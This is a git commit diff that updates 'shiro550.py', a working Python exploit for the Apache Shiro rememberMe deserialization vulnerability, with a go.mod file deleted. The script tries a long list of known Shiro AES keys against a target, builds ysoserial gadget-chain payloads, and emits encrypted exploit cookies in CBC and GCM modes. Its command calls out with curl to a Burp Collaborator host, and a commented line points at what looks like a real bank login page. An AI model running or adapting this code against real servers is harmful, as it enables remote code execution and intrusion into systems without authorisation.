00927dc117d6c993b8644e6f3deb188d3d560541
cyan <cyan>
2021-04-12 21:09:05 +0800

    update

--- c205.top/graduation/go.mod
+++
@@ -1,9 +0,0 @@
-module graduation
-
-go 1.14
-
-require (
-	github.com/gookit/color v1.2.4
-	github.com/miekg/dns v1.1.29
-	gopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c
-)
--- shiro550.py
+++ shiro550.py
@@ -3,7 +3,7 @@ how to use: python shiro_detect_url
 shiro <= 1.2.4
 '''
 import sys
-# import uuid
+import uuid
 import base64
 import subprocess
 import requests
@@ -19,9 +19,9 @@ red = "\x1B[31m"
 clear = "\x1b[0m"
 
 KEYS_SET = [
-"kPH+bIxk5D2deZiIxcaaaA==", #默认
-"4AvVhmFLUs0KTA3Kprsdag==", # jeecms
-"r0e3c16IdVkouZgk1TKVMg==", # jeesite
+"kPH+bIxk5D2deZiIxcaaaA==",  #默认
+"r0e3c16IdVkouZgk1TKVMg==",  # jeesite
+"4AvVhmFLUs0KTA3Kprsdag==",  # jeecms
 "Z3VucwAAAAAAAAAAAAAAAA==",
 "0Av6jWaXCkCu5A9nJbPxLI==",
 "0AvVhmFLUs0KTA3Kprsdag==",
@@ -37,6 +37,7 @@ KEYS_SET = [
 "3AvVhmFLUs0KTA3Kprsdag==",
 "3JvYhmBLUs0ETA5Kprsdag==",
 "3qDVdLawoIr1xFd6ietnwg==",
+"4AvVhmFLUsOKTA3Kprsdag==",
 "4BvVhmFLUs0KTA3Kprsdag==",
 "5aaC5qKm5oqA5pyvAAAAAA==",
 "5AvVhmFLUS0ATA4Kprsdag==",
@@ -85,6 +86,7 @@ KEYS_SET = [
 "IduElDUpDDXE677ZkhhKnQ==",
 "Is9zJ3pzNh2cgTHB4ua3+Q==",
 "Jt3C93kMR9D5e8QzwfsiMw==",
+"kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
 "L7RioUULEFhRyxM7a2R/Yg==",
 "lT2UvDUmQwewm6mMoiw4Ig==",
 "MDgBSEFqYIoWYezkWDywig==",
@@ -101,6 +103,7 @@ KEYS_SET = [
 "rPNqM6uKFCyaL10AK51UkQ==",
 "RVZBTk5JR0hUTFlfV0FPVQ==",
 "s0KTA3mFLUprK4AvVhsdag==",
+"s2SE9y32PvLeYo+VGFpcKA==",
 "SDKOLKn2J1j/2BHjeZwAoQ==",
 "sHdIjUN6tzhl8xZMG3ULCQ==",
 "SkZpbmFsQmxhZGUAAAAAAA==",
@@ -123,7 +126,6 @@ KEYS_SET = [
 "YI1+nBV//m7ELrIyDHm6DQ==",
 "Ymx1ZXdoYWxlAAAAAAAAAA==",
 "yNeUgSzL/CfiWw1GALg6Ag==",
-# "Z3h6eWd4enklMjElMjElMjE=",
 "ZAvph3dsQs0FSL3SDFAdag==",
 "ZmFsYWRvLnh5ei5zaGlybw==",
 "ZnJlc2h6Y24xMjM0NTY3OA==",
@@ -132,40 +134,72 @@ KEYS_SET = [
 JAVA_PATH = 'java'
 #YSOSERIAL_PATH = '/Users/cyan/HackerTools/command-tools/ysoserial-0.0.6-Plus.jar'
 YSOSERIAL_PATH = '/Users/cyan/Downloads/ysoserial-0.0.6-SNAPSHOT-all.jar'
-DNS_LOG_HOST = 'http://il780bvyc2uqmoxfvk2mepkdz45utj.burpcollaborator.net'
-PAYLOAD = 'JRMPClient'
-COMMAND = "8.210.56.187:80"
+DNS_LOG_HOST = 'http://va9iyhi3wcc6950rgpii1ursfjl99y.burpcollaborator.net'
+PAYLOAD = 'CommonsCollections6'
+COMMAND = "curl va9iyhi3wcc6950rgpii1ursfjl99y.burpcollaborator.net"
 # COMMAND = sys.argv[2]
 
 
-def general_serial(PAYLOAD,COMMAND):
-    popen = subprocess.Popen([JAVA_PATH, '-jar', YSOSERIAL_PATH, PAYLOAD, COMMAND], stdout=subprocess.PIPE)
+def ysoserial(payload,command):
+    popen = subprocess.Popen([JAVA_PATH, '-jar', YSOSERIAL_PATH, payload, command], stdout=subprocess.PIPE)
     serial_str = popen.stdout.read()
     return serial_str
 
-def encode_rememberme(serial_str,key):
+def cbc_encode(serial_str,key):
     BS = AES.block_size
     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
     key = base64.b64decode(key)
-    iv = b' ' * 16
-    # iv = uuid.uuid4().bytes
-    # print("iv:",iv)
+    iv = uuid.uuid4().bytes
     encryptor = AES.new(key, AES.MODE_CBC, iv)
-    # print(serial_str)
     file_body = pad(serial_str)
-    # print(serial_str)
     base64_ciphertext = str(base64.b64encode(iv + encryptor.encrypt(file_body)),"utf-8")
-    # print(base64_ciphertext)
-    # print("")
     return base64_ciphertext
 
-def decode_rememberme(base64_str,key):
+
+def cbc_decode(base64_str,key):
     seri_str = base64.b64decode(base64_str)
     mode = AES.MODE_CBC
-    iv = b' ' * 16
+    iv = seri_str[0:16]
+    encrypt_txt=seri_str[16:]
+    encrypt_txt += b'\x00' * (16-len(encrypt_txt)%16)
     encryptor = AES.new(base64.b64decode(key), mode, IV=iv)
-    remember_bin = encryptor.decrypt(seri_str)
-    return remember_bin
+    plain_text = encryptor.decrypt(encrypt_txt)
+    return plain_text
+
+
+def gcm_encode(serial_str,key):
+    BS   = AES.block_size
+    mode =  AES.MODE_GCM
+    iv   =  uuid.uuid4().bytes
+    encryptor = AES.new(base64.b64decode(key), mode, iv)
+    file_body=serial_str
+    enc,tag=encryptor.encrypt_and_digest(file_body)
+    base64_ciphertext = str(base64.b64encode(iv + enc+tag))
+    return base64_ciphertext
+
+
+def gcm_decode(base64_str,key):
+    BS   = AES.block_size
+    mode =  AES.MODE_GCM
+    cipher=base64.b64decode(base64_str)
+    iv=cipher[0:16]
+    enc=cipher[16:-16]
+    tag=cipher[-16:]
+    decryptor = AES.new(base64.b64decode(key), mode, iv)
+    plaintext=decryptor.decrypt_and_verify(enc,tag)
+    # base64_plaintext=base64.b64encode(plaintext).decode()
+    return plaintext
+
+def exp(key="kPH+bIxk5D2deZiIxcaaaA==",payload=PAYLOAD,command=COMMAND,mode="cbc"):
+    if mode== "gcm":
+        return gcm_encode(ysoserial(payload,command),key)
+    else:
+        return cbc_encode(ysoserial(payload,command),key)
+
+
+def dns_payload(key="kPH+bIxk5D2deZiIxcaaaA==",url=DNS_LOG_HOST,mode="cbc"):
+    return exp(key,"URLDNS",url,mode)
+
 
 def detect_shiro(url,cookie = {"rememberMe":"123"}):
     header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'}
@@ -181,59 +215,59 @@ def detect_shiro(url,cookie = {"rememberMe":"123"}):
     #   print(f"{h}: {res.headers[h]}")
     return 0
 
-def dns_payload(url=DNS_LOG_HOST,key='kPH+bIxk5D2deZiIxcaaaA=='):
-    return encode_rememberme(general_serial("URLDNS",url),key)
-
-def exp(key='kPH+bIxk5D2deZiIxcaaaA==',payload=PAYLOAD,command=COMMAND):
-    return encode_rememberme(general_serial(PAYLOAD,COMMAND),key)
-
-def check_key(target):
-    code=detect_shiro(target)
-    if code == 1:
-        print("-"*80)
-        print(f'target: {target}')
-        print("-"*80)
-        # simplePrincipalCollection 序列化数据，用于检测 shiro 的 key 是否正确, 错误的 key 会返回 rememberMe=deleteMe，正确则不会返回 rememberMe
-        simplePrincipalCollection_bin_base64encode = 'rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=='
-        serial_str=base64.b64decode(simplePrincipalCollection_bin_base64encode)
-        for key in KEYS_SET:
-            remember_str = encode_rememberme(serial_str,key)
-            cookie = {"rememberMe": remember_str}
-            if detect_shiro(target,cookie) == 0:
-                print(red + f"Checked\tKEY: {key}\t valid" + clear)
-                return key
-            print(f"Checked\tKEY: {key}")
+def check_key(target,mode="cbc"):
+    print("-"*80)
+    print(f'target: {target}    mode: {mode}')
+    print("-"*80)
+    # simplePrincipalCollection 序列化数据，用于检测 shiro 的 key 是否正确, 错误的 key 会返回 rememberMe=deleteMe，正确则不会返回 rememberMe
+    simplePrincipalCollection_bin_base64encode = 'rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=='
+    serial_str=base64.b64decode(simplePrincipalCollection_bin_base64encode)
+    for key in KEYS_SET:
+        if mode=="gcm":
+            remember_str = gcm_encode(serial_str,key)
         else:
-            print("-"*80)
-            print("Not found a valid key")
-    elif code == -1:
-        print(f'{target}: request error')
+            remember_str = cbc_encode(serial_str,key)
+        cookie = {"rememberMe": remember_str}
+        if detect_shiro(target,cookie) == 0:
+            print(red + f"Checked\tKEY: {key}\t valid" + clear)
+            return key
+        print(f"Checked\tKEY: {key}")
     else:
-        print(f'{target}: Not Find Shiro')
+        print("-"*80)
+        print("Not found a valid key")
+
     return ''
 
 if __name__ == '__main__':
     # tomcat + cc3.2.1 => cc10
     # cc4.0 => cc2
-    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'}
-
+    # header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'}
     CC = ["CommonsBeanutils1","Jdk7u21","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","CommonsCollections8","CommonsCollections9","CommonsCollections10"]
+
     if len(sys.argv) > 1:
         target = sys.argv[1]
-        key=check_key(target)
-        if key!='':
-            print("-"*80)
-            print(f"PAYLOAD: DNSLOG\tURL: {DNS_LOG_HOST}")
-            print("-"*80)
-            print(dns_payload(key=key))
-            id = 1;
-            # for cc in CC:
-            print("-"*80)
-            print(f"{id}\tPAYLOAD: {PAYLOAD}\tCOMMAND: {COMMAND}")
-            # detect_shiro("http://fzmh.cib.com.cn/a/login",cookie = {"rememberMe": exp(key)})
-            print("-"*80)
-            # id+=1
-            print(exp(key))
+        code=detect_shiro(target)
+        if code == 1:
+            for mode in ["cbc","gcm"]:
+                key=check_key(target,mode=mode)
+                if key!='':
+                    print("-"*80)
+                    print(f"PAYLOAD: DNSLOG\tURL: {DNS_LOG_HOST}")
+                    print("-"*80)
+                    print(dns_payload(key=key,mode=mode))
+                    id = 1;
+                    # for cc in CC:
+                    print("-"*80)
+                    print(f"{id}\tPAYLOAD: {PAYLOAD}\tCOMMAND: {COMMAND}")
+                    # detect_shiro("http://fzmh.cib.com.cn/a/login",cookie = {"rememberMe": exp(key)})
+                    print("-"*80)
+                    # id+=1
+                    print(exp(key,mode=mode))
+                    break
+        elif code == -1:
+            print(f'{target}: request error')
+        else:
+            print(f'{target}: Not Find Shiro')
     else:
         print(f"shiro https://example.com/")
 
